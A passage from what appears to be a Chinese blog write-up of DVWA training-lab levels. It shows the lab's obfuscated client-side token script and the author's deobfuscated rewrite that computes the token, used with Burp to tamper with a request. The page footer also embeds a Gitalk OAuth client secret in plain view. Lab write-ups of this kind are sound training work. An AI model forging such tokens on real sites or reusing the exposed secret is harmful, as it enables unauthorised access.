class="attr">f</span>&gt;</span></span>&gt;&gt;25)|(f<span class="xml"><span class="tag">&lt;&lt;<span class="attr">7</span>));<span class="attr">1D</span>=<span class="string">b&amp;c;1j</span>=<span class="string">1D^(b&amp;d)^1V;1h</span>=<span class="string">(f&amp;g)^(~f&amp;h);v</span>=<span class="string">e+1b+1h+K[j+3]+l[j+3];1f</span>=<span class="string">1a+1j;e</span>=<span class="string">a+v</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">a</span>=<span class="string">v+1f</span>&lt;&lt;<span class="attr">0</span>&#125;<span class="attr">k.C</span>=<span class="string">k.C+a</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">k.B</span>=<span class="string">k.B+b</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">k.E</span>=<span class="string">k.E+c</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">k.F</span>=<span class="string">k.F+d</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">k.J</span>=<span class="string">k.J+e</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">k.I</span>=<span class="string">k.I+f</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">k.H</span>=<span class="string">k.H+g</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">k.D</span>=<span class="string">k.D+h</span>&lt;&lt;<span class="attr">0</span>&#125;;<span class="attr">N.Q.1e</span>=<span class="string">w()&#123;k.1s();q\x20C</span>=<span class="string">k.C,B</span>=<span class="string">k.B,E</span>=<span class="string">k.E,F</span>=<span class="string">k.F,J</span>=<span class="string">k.J,I</span>=<span class="string">k.I,H</span>=<span class="string">k.H,D</span>=<span class="string">k.D;q\x201e</span>=<span class="string">m[(C</span>&gt;</span></span>&gt;28)&amp;o]+m[<span class="string">(C&gt;&gt;24)&amp;o</span>]+m[<span class="string">(C&gt;&gt;20)&amp;o</span>]+m[<span class="string">(C&gt;&gt;16)&amp;o</span>]+m[<span class="string">(C&gt;&gt;12)&amp;o</span>]+m[<span class="string">(C&gt;&gt;8)&amp;o</span>]+m[<span class="string">(C&gt;&gt;4)&amp;o</span>]+m[<span class="string">C&amp;o</span>]+m[<span class="string">(B&gt;&gt;28)&amp;o</span>]+m[<span class="string">(B&gt;&gt;24)&amp;o</span>]+m[<span class="string">(B&gt;&gt;20)&amp;o</span>]+m[<span class="string">(B&gt;&gt;16)&amp;o</span>]+m[<span class="string">(B&gt;&gt;12)&amp;o</span>]+m[<span class="string">(B&gt;&gt;8)&amp;o</span>]+m[<span class="string">(B&gt;&gt;4)&amp;o</span>]+m[<span class="string">B&amp;o</span>]+m[<span class="string">(E&gt;&gt;28)&amp;o</span>]+m[<span class="string">(E&gt;&gt;24)&amp;o</span>]+m[<span class="string">(E&gt;&gt;20)&amp;o</span>]+m[<span class="string">(E&gt;&gt;16)&amp;o</span>]+m[<span class="string">(E&gt;&gt;12)&amp;o</span>]+m[<span class="string">(E&gt;&gt;8)&amp;o</span>]+m[<span class="string">(E&gt;&gt;4)&amp;o</span>]+m[<span class="string">E&amp;o</span>]+m[<span class="string">(F&gt;&gt;28)&amp;o</span>]+m[<span class="string">(F&gt;&gt;24)&amp;o</span>]+m[<span class="string">(F&gt;&gt;20)&amp;o</span>]+m[<span class="string">(F&gt;&gt;16)&amp;o</span>]+m[<span class="string">(F&gt;&gt;12)&amp;o</span>]+m[<span class="string">(F&gt;&gt;8)&amp;o</span>]+m[<span class="string">(F&gt;&gt;4)&amp;o</span>]+m[<span class="string">F&amp;o</span>]+m[<span class="string">(J&gt;&gt;28)&amp;o</span>]+m[<span class="string">(J&gt;&gt;24)&amp;o</span>]+m[<span class="string">(J&gt;&gt;20)&amp;o</span>]+m[<span class="string">(J&gt;&gt;16)&amp;o</span>]+m[<span class="string">(J&gt;&gt;12)&amp;o</span>]+m[<span class="string">(J&gt;&gt;8)&amp;o</span>]+m[<span class="string">(J&gt;&gt;4)&amp;o</span>]+m[<span class="string">J&amp;o</span>]+m[<span class="string">(I&gt;&gt;28)&amp;o</span>]+m[<span class="string">(I&gt;&gt;24)&amp;o</span>]+m[<span class="string">(I&gt;&gt;20)&amp;o</span>]+m[<span class="string">(I&gt;&gt;16)&amp;o</span>]+m[<span class="string">(I&gt;&gt;12)&amp;o</span>]+m[<span class="string">(I&gt;&gt;8)&amp;o</span>]+m[<span class="string">(I&gt;&gt;4)&amp;o</span>]+m[<span class="string">I&amp;o</span>]+m[<span class="string">(H&gt;&gt;28)&amp;o</span>]+m[<span class="string">(H&gt;&gt;24)&amp;o</span>]+m[<span class="string">(H&gt;&gt;20)&amp;o</span>]+m[<span class="string">(H&gt;&gt;16)&amp;o</span>]+m[<span class="string">(H&gt;&gt;12)&amp;o</span>]+m[<span class="string">(H&gt;&gt;8)&amp;o</span>]+m[<span class="string">(H&gt;&gt;4)&amp;o</span>]+m[<span class="string">H&amp;o</span>];p(!k.x)&#123;1e+=m[<span class="string">(D&gt;&gt;28)&amp;o</span>]+m[<span class="string">(D&gt;&gt;24)&amp;o</span>]+m[<span class="string">(D&gt;&gt;20)&amp;o</span>]+m[<span class="string">(D&gt;&gt;16)&amp;o</span>]+m[<span class="string">(D&gt;&gt;12)&amp;o</span>]+m[<span class="string">(D&gt;&gt;8)&amp;o</span>]+m[<span class="string">(D&gt;&gt;4)&amp;o</span>]+m[<span class="string">D&amp;o</span>]&#125;A\x201e&#125;;N.Q.2U=N.Q.1e;N.Q.1G=w()&#123;k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[<span class="string">(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u</span>];p(!k.x)&#123;2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)&#125;A\x202b&#125;;N.Q.27=N.Q.1G;N.Q.2R=w()&#123;k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x)&#123;1i.1p(28,k.D)&#125;A\x201w&#125;;w\x201P(G,x,1v)&#123;q\x20i,T=1c\x20G;p(T===\x272p\x27)&#123;q\x20L=[<span class="string"></span>],W=G.W,M=0,r;1g(i=0;i<span class="xml"><span class="tag">&lt;<span class="name">W;++i)&#123;r=G.1Q(i);p(r</span>&lt;<span class="attr">R</span>)&#123;<span class="attr">L</span>[<span class="attr">M</span>++]=<span class="string">r&#125;z\x20p(r</span>&lt;<span class="attr">2v</span>)&#123;<span class="attr">L</span>[<span class="attr">M</span>++]=<span class="string">(2t|(r</span>&gt;</span></span>&gt;6));L[<span class="string">M++</span>]=(R|(r&amp;V))&#125;z\x20p(r<span class="xml"><span class="tag">&lt;<span class="name">2A||r</span>&gt;</span></span>=2E)&#123;L[<span class="string">M++</span>]=(2D|(r&gt;&gt;12));L[<span class="string">M++</span>]=(R|((r&gt;&gt;6)&amp;V));L[<span class="string">M++</span>]=(R|(r&amp;V))&#125;z&#123;r=2C+(((r&amp;23)<span class="xml"><span class="tag">&lt;&lt;<span class="attr">10</span>)|(<span class="attr">G.1Q</span>(++<span class="attr">i</span>)&amp;<span class="attr">23</span>));<span class="attr">L</span>[<span class="attr">M</span>++]=<span class="string">(2X|(r</span>&gt;</span></span>&gt;18));L[<span class="string">M++</span>]=(R|((r&gt;&gt;12)&amp;V));L[<span class="string">M++</span>]=(R|((r&gt;&gt;6)&amp;V));L[<span class="string">M++</span>]=(R|(r&amp;V))&#125;&#125;G=L&#125;z&#123;p(T===\x271n\x27)&#123;p(G===2q)&#123;1u\x20O\x201t(1l)&#125;z\x20p(1y&amp;&amp;G.1J===Z)&#123;G=O\x202r(G)&#125;z\x20p(!1z.1K(G))&#123;p(!1y||!Z.1N(G))&#123;1u\x20O\x201t(1l)&#125;&#125;&#125;z&#123;1u\x20O\x201t(1l)&#125;&#125;p(G.W&gt;1k)&#123;G=(O\x20N(x,1d)).S(G).27()&#125;q\x201F=[<span class="string"></span>],2e=[<span class="string"></span>];1g(i=0;i<span class="xml"><span class="tag">&lt;<span class="name">1k;++i)&#123;q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b&#125;N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v&#125;1P.Q=O\x20N();1P.Q.1s=w()&#123;N.Q.1s.1I(k);p(k.2c)&#123;k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)&#125;&#125;;q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G)&#123;2g.X=X&#125;z&#123;Y.1q=X.1q;Y.1H=X.1H;p(2s)&#123;2l(w()&#123;A\x20X&#125;)&#125;&#125;&#125;)();w\x202y(e)&#123;1g(q\x20t=\x22\x22,n=e.W-1;n</span>&gt;</span></span>=0;n--)t+=e[<span class="string">n</span>];A\x20t&#125;w\x202J(t,y=\x224B\x22)&#123;1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)&#125;w\x202B(e=\x224E\x22)&#123;1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)&#125;w\x202K(a,b)&#123;1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)&#125;1m.1o(\x222F\x22).1r=\x22\x22;4u(w()&#123;2B(\x224M\x22)&#125;,4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);','||||||||||||||||||||this|blocks|HEX<span class="emphasis">_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_</span>BUFFER|Array|start|ab|block|bc|OUTPUT<span class="emphasis">_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_</span>JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do<span class="emphasis">_something|nodeMethod|0xd800|token_</span>part<span class="emphasis">_2|0x10000|0xe0|0xe000|phrase|COMMON_</span>JS|4294967296|window|token<span class="emphasis">_part_</span>3|token<span class="emphasis">_part_</span>1|WEB<span class="emphasis">_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_</span>SHA256<span class="emphasis">_NO_</span>NODE<span class="emphasis">_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_</span>SHA256<span class="emphasis">_NO_</span>ARRAY<span class="emphasis">_BUFFER|is|invalid|input|strict|use|JS_</span>SHA256<span class="emphasis">_NO_</span>WINDOW|ABCD|amd|JS<span class="emphasis">_SHA256_</span>NO<span class="emphasis">_COMMON_</span>JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS<span class="emphasis">_SHA256_</span>NO<span class="emphasis">_ARRAY_</span>BUFFER<span class="emphasis">_IS_</span>VIEW','split'];(function(c,d)&#123;var e=function(f)&#123;while(--f)&#123;c[<span class="string">'push'</span>](<span class="link">c['shift'](</span>));&#125;&#125;;e(++d);&#125;(a,0x1f4));var b=function(c,d)&#123;c=c-0x0;var e=a[<span class="string">c</span>];return e;&#125;;eval(function(d,e,f,g,h,i)&#123;h=function(j)&#123;return(j<span class="xml"><span class="tag">&lt;<span class="name">e?'':h(parseInt(j</span>/<span class="attr">e</span>)))+((<span class="attr">j</span>=<span class="string">j%e)</span>&gt;</span></span>0x23?String[<span class="string">b('0x0')</span>](<span class="link">j+0x1d</span>):j[<span class="string">b('0x1')</span>](<span class="link">0x24</span>));&#125;;if(!''[<span class="string">b('0x2')</span>](<span class="link">/^/,String</span>))&#123;while(f--)&#123;i[<span class="string">h(f)</span>]=g[<span class="string">f</span>]||h(f);&#125;g=[<span class="string">function(k)&#123;if('wpA'!==b('0x3'))&#123;return i[k</span>];&#125;else&#123;while(f--)&#123;i[<span class="string">k(f)</span>]=g[<span class="string">f</span>]||k(f);&#125;g=[<span class="string">function(l)&#123;return i[l</span>];&#125;];k=function()&#123;return b('0x4');&#125;;f=0x1;&#125;&#125;];h=function()&#123;return b('0x4');&#125;;f=0x1;&#125;;while(f--)&#123;if(g[<span class="string">f</span>])&#123;if(b('0x5')===b('0x6'))&#123;return i[<span class="string">h</span>];&#125;else&#123;d=d[<span class="string">b('0x2')</span>](<span class="link">new RegExp('\x5cb'+h(f</span>)+'\x5cb','g'),g[<span class="string">f</span>]);&#125;&#125;&#125;return d;&#125;(b('0x7'),0x3e,0x137,b('0x8')[<span class="string">b('0x9')</span>](<span class="link">'|'</span>),0x0,&#123;&#125;));</span><br></pre></td></tr></table></figure>

<p>发现都是加密的，通过站点：<a href="http://deobfuscatejavascript.com/#" target="_blank" rel="noopener">http://deobfuscatejavascript.com/#</a></p>
<p>进行解密，得到关键的信息，前面是一段sha加密算法，可不看，关键之处如下：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/99.png" alt></p>
<p>修改相关源码</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">......省略加密代码</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span><span class="params">(e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">""</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> token;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span><span class="params">(t, y = <span class="string">"ZZ"</span>)</span> </span>&#123;</span><br><span class="line">    token = sha256(token + y);</span><br><span class="line">	alert(<span class="string">'token_part_3_final-----'</span>+token);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span><span class="params">(e)</span> </span>&#123;</span><br><span class="line">    token = sha256(e + token);</span><br><span class="line">	 alert(<span class="string">'token_part_2-----'</span>+token);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span><span class="params">(a, b)</span> </span>&#123;</span><br><span class="line">   token= do_something(<span class="string">"success"</span>);</span><br><span class="line">   alert(<span class="string">'token_part_1-----'</span>+token);</span><br><span class="line">&#125;</span><br><span class="line">token_part_1(<span class="string">"ABCD"</span>, <span class="number">44</span>);<span class="comment">//模拟加载时执行</span></span><br><span class="line">token_part_2(<span class="string">"XX"</span>)<span class="comment">//模拟过300ms，其实就是页面渲染完成后执行</span></span><br><span class="line">token_part_3()<span class="comment">//模拟提交时执行</span></span><br></pre></td></tr></table></figure>

<p>实际运行时，需要将前面的加密算法部分也加入</p>
<p>打开页面就可以获得token，并使用bp拦截报文修改相关参数，注入成功。</p>
</div><div class="post-copyright"><blockquote><p>原文作者: fzykn06</p><p>原文链接: <a href="http://fzykn06.github.io/2020/06/29/DVWA关卡纪录/">http://fzykn06.github.io/2020/06/29/DVWA关卡纪录/</a></p><p>版权声明: 转载请注明出处(必须保留作者署名及链接)</p></blockquote></div><div class="tags"><a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post-share"><div class="social-share"><span>分享到:</span></div><div data-thread-key="2020/06/29/DVWA关卡纪录/" data-title="DVWA关卡纪录" data-url="http://fzykn06.github.io/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/" class="ds-share flat"><div class="ds-share-inline"><ul class="ds-share-icons-16"><li data-toggle="ds-share-icons-more"><a href="javascript:void(0);" class="ds-more">分享到:</a></li><li><a href="javascript:void(0);" data-service="weibo" class="ds-weibo">微博</a></li><li><a href="javascript:void(0);" data-service="qzone" class="ds-qzone">QQ空间</a></li><li><a href="javascript:void(0);" data-service="qqt" class="ds-qqt">腾讯微博</a></li><li><a href="javascript:void(0);" data-service="wechat" class="ds-wechat">微信</a></li></ul><div class="ds-share-icons-more"></div></div></div><div class="bdsharebuttonbox"><span style="float:left;line-height: 28px;height: 28px;font-size:16px;font-weight:blod">分享到:</span><a href="#" data-cmd="more" class="bds_more"></a><a href="#" data-cmd="mshare" title="分享到一键分享" class="bds_mshare"></a><a href="#" data-cmd="fbook" title="分享到Facebook" class="bds_fbook"></a><a href="#" data-cmd="twi" title="分享到Twitter" class="bds_twi"></a><a href="#" data-cmd="linkedin" title="分享到linkedin" class="bds_linkedin"></a><a href="#" data-cmd="youdao" title="分享到有道云笔记" class="bds_youdao"></a><a href="#" data-cmd="evernotecn" title="分享到印象笔记" class="bds_evernotecn"></a><a href="#" data-cmd="weixin" title="分享到微信" class="bds_weixin"></a><a href="#" data-cmd="qzone" title="分享到QQ空间" class="bds_qzone"></a><a href="#" data-cmd="tsina" title="分享到新浪微博" class="bds_tsina"></a></div><div class="jiathis_style"><span class="jiathis_txt">分享到:</span><a class="jiathis_button_tsina"></a><a class="jiathis_button_qzone"></a><a class="jiathis_button_weixin"></a><a class="jiathis_button_fb"></a><a class="jiathis_button_linkedin"></a><a class="jiathis_button_twitter"></a><a class="jiathis_button_ydnote"></a><a href="http://www.jiathis.com/share" target="_blank" rel="noopener" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis"></a><a class="jiathis_counter_style"></a></div></div><div class="post-nav"><a href="/2020/06/29/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%A6%82%E8%BF%B0/" class="pre">Web中间件漏洞基本原理、危害及修复概述</a><a href="/2019/12/27/sqli-labs-writeup/" class="next">sqli-labs-writeup</a></div><div id="comments"><div id="container"><script type="text/javascript" src="https://unpkg.com/gitalk/dist/gitalk.min.js?v=2.0.4"></script><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=2.0.4"></script><script>var gitalk = new Gitalk({
  clientID: '1817bee0e9bebbfec568',
  clientSecret: '0fed554209288ad9037d80cb0f5512d26423ad31',
  repo: 'fzykn06.github.io',
  owner: 'fzykn06',
  admin: ['fzykn06'],
  id: md5(window.location.pathname),
  distractionFreeMode: false,
  language: 'zh-CN',
  pagerDirection: 'last'
})
gitalk.render('container')</script></div></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">文章目录</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-1"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-1"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-1"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-1"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-2"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-2"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-2"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-2"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Inclusion"><span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-3"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-3"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-3"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-3"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Upload"><span class="toc-text">File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-4"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-4"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-4"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-4"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-CAPTCHA"><span class="toc-text">Insecure CAPTCHA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-5"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-5"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-5"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-5"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-6"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-6"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-6"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-6"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Blind"><span class="toc-text">SQL Injection(Blind)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-7"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-7"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-7"><span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Impossible-7"><span class="toc-text">Impossible</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS（Reflect）反射型XSS"><span class="toc-text">XSS（Reflect）反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-8"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-8"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-8"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-8"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS（Stored）存储型XSS"><span class="toc-text">XSS（Stored）存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-9"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-9"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-9"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-9"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-DOM"><span class="toc-text">XSS(DOM)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-10"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-10"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-10"><span class="toc-text">High</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Session-IDs-弱会话IDs"><span class="toc-text">Weak Session IDs(弱会话IDs)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-11"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-11"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-11"><span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-10"><span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Bypass"><span class="toc-text">CSP Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-12"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-12"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-12"><span class="toc-text">High</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript"><span class="toc-text">JavaScript</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-13"><span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-13"><span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-13"><span class="toc-text">High</span></a></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" 